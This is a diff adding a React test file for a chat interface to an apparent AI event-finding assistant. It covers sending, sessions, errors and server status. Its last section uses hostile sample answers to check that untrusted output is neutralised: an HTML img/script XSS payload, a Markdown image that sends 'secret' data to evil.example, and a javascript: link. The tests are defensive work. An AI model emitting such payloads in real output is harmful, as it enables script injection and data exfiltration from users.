@@ -1,0 +1,315 @@
+import { render, screen, waitFor } from "@testing-library/react";
+import userEvent from "@testing-library/user-event";
+import { beforeEach, describe, expect, it, vi } from "vitest";
+
+import type { ChatResponse, Health } from "@/lib/api";
+
+import { Chat } from "./Chat";
+
+const HEALTH: Health = {
+  status: "ok",
+  data_source: "sample",
+  model: "claude-sonnet-5-5",
+  available_engines: ["custom", "langgraph"],
+  tracing: false,
+};
+
+function reply(overrides: Partial<ChatResponse> = {}): ChatResponse {
+  return {
+    session_id: "session-1",
+    engine: "custom",
+    answer: "Here's what I found.",
+    stop_reason: "end_turn",
+    steps: 1,
+    tool_calls: [],
+    usage: { input_tokens: 1000, cache_read_tokens: 0, cache_write_tokens: 0, output_tokens: 100 },
+    cost_usd: 0.004,
+    seconds: 3.2,
+    ...overrides,
+  };
+}
+
+function json(body: unknown, status = 200) {
+  return new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });
+}
+
+/** A stand-in for the server. Each chat request gets the next response in the list. */
+function stubServer(chatResponses: (Response | Promise<Response>)[] = [], health: Response | Response[] = json(HEALTH)) {
+  const queue = [...chatResponses];
+  const healthQueue = Array.isArray(health) ? [...health] : [health];
+  const fetchMock = vi.fn((path: string, init?: RequestInit) => {
+    if (path === "/api/health") {
+      // The last health response repeats, for as long as the page keeps checking.
+      const current = healthQueue.length > 1 ? healthQueue.shift()! : healthQueue[0];
+      return Promise.resolve(current.clone());
+    }
+    if (init?.method === "DELETE") return Promise.resolve(new Response(null, { status: 204 }));
+    const next = queue.shift();
+    if (!next) throw new Error("No scripted chat response left");
+    return Promise.resolve(next);
+  });
+  vi.stubGlobal("fetch", fetchMock);
+  return fetchMock;
+}
+
+function chatBodies(fetchMock: ReturnType<typeof stubServer>) {
+  return fetchMock.mock.calls
+    .filter(([path, init]) => path === "/api/chat" && init?.method === "POST")
+    .map(([, init]) => JSON.parse(init?.body as string) as Record<string, unknown>);
+}
+
+function deletedPaths(fetchMock: ReturnType<typeof stubServer>) {
+  return fetchMock.mock.calls.filter(([, init]) => init?.method === "DELETE").map(([path]) => path);
+}
+
+async function ask(user: ReturnType<typeof userEvent.setup>, text = "any jazz?") {
+  await user.type(screen.getByLabelText("Your message"), text);
+  await user.click(screen.getByRole("button", { name: "Send" }));
+}
+
+describe("Chat", () => {
+  let user: ReturnType<typeof userEvent.setup>;
+
+  beforeEach(() => {
+    user = userEvent.setup();
+  });
+
+  it("shows the question and answer, with its measurements", async () => {
+    stubServer([json(reply())]);
+    render(<Chat />);
+    await ask(user);
+
+    expect(await screen.findByText("Here's what I found.")).toBeInTheDocument();
+    expect(screen.getByText("any jazz?")).toBeInTheDocument();
+    expect(screen.getByText("3.2s · 1 step · under 1¢")).toBeInTheDocument();
+    expect(screen.getByLabelText("Your message")).toHaveValue("");
+  });
+
+  it("continues the same conversation on follow-up questions", async () => {
+    const fetchMock = stubServer([json(reply()), json(reply({ answer: "Second." }))]);
+    render(<Chat />);
+    await ask(user, "first");
+    await screen.findByText("Here's what I found.");
+    await ask(user, "second");
+    await screen.findByText("Second.");
+
+    expect(chatBodies(fetchMock)).toEqual([
+      { message: "first", engine: "custom", session_id: null },
+      { message: "second", engine: "custom", session_id: "session-1" },
+    ]);
+  });
+
+  it("sends on Enter and adds a new line on Shift+Enter", async () => {
+    const fetchMock = stubServer([json(reply())]);
+    render(<Chat />);
+    const input = screen.getByLabelText("Your message");
+    await user.type(input, "line one{Shift>}{Enter}{/Shift}line two");
+    expect(chatBodies(fetchMock)).toHaveLength(0);
+
+    await user.keyboard("{Enter}");
+    await screen.findByText("Here's what I found.");
+    expect(chatBodies(fetchMock)[0].message).toBe("line one\nline two");
+  });
+
+  it("won't send an empty message", async () => {
+    const fetchMock = stubServer();
+    render(<Chat />);
+    const input = screen.getByLabelText("Your message");
+    await user.type(input, "   {Enter}");
+
+    expect(screen.getByRole("button", { name: "Send" })).toBeDisabled();
+    expect(chatBodies(fetchMock)).toHaveLength(0);
+  });
+
+  it("shows a working state, and blocks another send until the reply arrives", async () => {
+    let finish!: (response: Response) => void;
+    const fetchMock = stubServer([new Promise<Response>((resolve) => (finish = resolve))]);
+    render(<Chat />);
+    await ask(user, "first");
+
+    expect(screen.getByRole("status")).toHaveTextContent("Working on it");
+    await user.type(screen.getByLabelText("Your message"), "too soon{Enter}");
+    expect(chatBodies(fetchMock)).toHaveLength(1);
+    expect(screen.getByLabelText("Engine")).toBeDisabled();
+
+    finish(json(reply()));
+    await screen.findByText("Here's what I found.");
+    expect(screen.queryByRole("status")).not.toBeInTheDocument();
+  });
+
+  it("lists the tool calls it made, marking failures", async () => {
+    stubServer([
+      json(
+        reply({
+          steps: 3,
+          tool_calls: [
+            { tool: "search_events", input: { keyword: "jazz", city: "Austin" }, is_error: false },
+            { tool: "get_event_details", input: { event_id: "x" }, is_error: true },
+          ],
+        }),
+      ),
+    ]);
+    render(<Chat />);
+    await ask(user);
+
+    await user.click(await screen.findByText(/2 tool calls/));
+    expect(screen.getByText("Searched for jazz in Austin")).toBeVisible();
+    expect(screen.getByText("Looked up event details (failed)")).toBeVisible();
+  });
+
+  it.each([
+    ["max_tokens", "cut off"],
+    ["refusal", "declined"],
+    ["step_limit", "step limit"],
+  ])("says when a reply stopped with %s", async (stop_reason, expected) => {
+    stubServer([json(reply({ stop_reason }))]);
+    render(<Chat />);
+    await ask(user);
+    expect(await screen.findByText(new RegExp(expected))).toBeInTheDocument();
+  });
+
+  describe("when a question fails", () => {
+    it("explains why, restores the text, and starts a new conversation next", async () => {
+      const fetchMock = stubServer([
+        json(reply()),
+        json({ detail: "Rate limited by the API." }, 429),
+        json(reply({ session_id: "session-2", answer: "Back again." })),
+      ]);
+      render(<Chat />);
+      await ask(user, "first");
+      await screen.findByText("Here's what I found.");
+      await ask(user, "second");
+
+      expect(await screen.findByRole("alert")).toHaveTextContent("Rate limited by the API.");
+      expect(screen.getByRole("alert")).toHaveTextContent("starts a new conversation");
+      expect(screen.getByLabelText("Your message")).toHaveValue("second");
+
+      await user.click(screen.getByRole("button", { name: "Send" }));
+      await screen.findByText("Back again.");
+      expect(chatBodies(fetchMock)[2]).toEqual({ message: "second", engine: "custom", session_id: null });
+    });
+  });
+
+  describe("starting over", () => {
+    it("New chat clears the screen and ends the conversation on the server", async () => {
+      const fetchMock = stubServer([json(reply())]);
+      render(<Chat />);
+      await ask(user);
+      await screen.findByText("Here's what I found.");
+      await user.click(screen.getByRole("button", { name: "New chat" }));
+
+      expect(screen.queryByText("Here's what I found.")).not.toBeInTheDocument();
+      expect(deletedPaths(fetchMock)).toEqual(["/api/chat/session-1"]);
+    });
+
+    it("changing the engine starts a new chat on that engine", async () => {
+      const fetchMock = stubServer([json(reply()), json(reply({ session_id: "session-2", engine: "langgraph" }))]);
+      render(<Chat />);
+      await ask(user, "first");
+      await screen.findByText("Here's what I found.");
+      await user.selectOptions(screen.getByLabelText("Engine"), "langgraph");
+
+      expect(screen.queryByText("first")).not.toBeInTheDocument();
+      expect(deletedPaths(fetchMock)).toEqual(["/api/chat/session-1"]);
+
+      await ask(user, "second");
+      await screen.findByText("Here's what I found.");
+      expect(chatBodies(fetchMock)[1]).toEqual({ message: "second", engine: "langgraph", session_id: null });
+    });
+
+    it("doesn't show an error if ending the old conversation fails", async () => {
+      const fetchMock = stubServer([json(reply())]);
+      render(<Chat />);
+      await ask(user);
+      await screen.findByText("Here's what I found.");
+      fetchMock.mockImplementationOnce(() => Promise.reject(new TypeError("offline")));
+      await user.click(screen.getByRole("button", { name: "New chat" }));
+
+      await waitFor(() => expect(screen.queryByText("Here's what I found.")).not.toBeInTheDocument());
+      expect(screen.queryByRole("alert")).not.toBeInTheDocument();
+    });
+  });
+
+  describe("server status", () => {
+    it("names the data source", async () => {
+      stubServer([], json({ ...HEALTH, data_source: "ticketmaster" }));
+      render(<Chat />);
+      expect(await screen.findByText("Live Ticketmaster data")).toBeInTheDocument();
+    });
+
+    it("disables an engine that can't run", async () => {
+      stubServer([], json({ ...HEALTH, available_engines: ["custom"] }));
+      render(<Chat />);
+      await screen.findByText("Sample data");
+      expect(screen.getByRole("option", { name: "LangGraph" })).toBeDisabled();
+      expect(screen.getByRole("option", { name: "Custom loop" })).toBeEnabled();
+    });
+
+    it("says when the server can't be reached", async () => {
+      stubServer([], new Response("Internal Server Error", { status: 500 }));
+      render(<Chat />);
+      expect(await screen.findByRole("alert")).toHaveTextContent("Can't reach the API server");
+    });
+  });
+
+  it("clears the warning once a slow-starting server is ready", async () => {
+    stubServer([], [new Response("Internal Server Error", { status: 500 }), json(HEALTH)]);
+    render(<Chat healthRetryMs={1} />);
+
+    expect(await screen.findByText("Sample data")).toBeInTheDocument();
+    expect(screen.queryByRole("alert")).not.toBeInTheDocument();
+  });
+
+  it("an example fills the box but doesn't send, because sending costs money", async () => {
+    const fetchMock = stubServer();
+    render(<Chat />);
+    await user.click(screen.getByRole("button", { name: /Chicago this weekend/ }));
+
+    expect(screen.getByLabelText("Your message")).toHaveValue("What concerts are on in Chicago this weekend?");
+    expect(chatBodies(fetchMock)).toHaveLength(0);
+  });
+
+  it("shows Markdown tables as tables", async () => {
+    stubServer([json(reply({ answer: "| Show | Price |\n|---|---|\n| Velvet Static | $45 |" }))]);
+    render(<Chat />);
+    await ask(user);
+
+    expect(await screen.findByRole("table")).toBeInTheDocument();
+    expect(screen.getByRole("cell", { name: "$45" })).toBeInTheDocument();
+  });
+
+  describe("answers are untrusted", () => {
+    it("shows HTML as text instead of running it", async () => {
+      const { container } = render(<Chat />);
+      stubServer([json(reply({ answer: 'Show: <img src="https://evil.example/x" onerror="alert(1)"><script>alert(1)</script>' }))]);
+      await ask(user);
+      await screen.findByText(/Show:/);
+
+      expect(container.querySelector("script")).toBeNull();
+      expect(container.querySelector("img")).toBeNull();
+    });
+
+    it("removes Markdown images, which would send a request to any address", async () => {
+      const { container } = render(<Chat />);
+      stubServer([json(reply({ answer: "Before ![secret](https://evil.example/?data=secret) after" }))]);
+      await ask(user);
+      await screen.findByText(/Before/);
+
+      expect(container.querySelector("img")).toBeNull();
+      expect(container.innerHTML).not.toContain("evil.example");
+    });
+
+    it("opens links safely, and drops dangerous ones", async () => {
+      stubServer([json(reply({ answer: "[Tickets](https://example.com/t) and [bad](javascript:alert(1))" }))]);
+      render(<Chat />);
+      await ask(user);
+
+      const link = await screen.findByRole("link", { name: "Tickets" });
+      expect(link).toHaveAttribute("href", "https://example.com/t");
+      expect(link).toHaveAttribute("target", "_blank");
+      expect(link).toHaveAttribute("rel", "noopener noreferrer");
+      expect(screen.queryByRole("link", { name: "bad" })).not.toBeInTheDocument();
+      expect(screen.getByText(/and bad/)).toBeInTheDocument();
+    });
+  });
+});
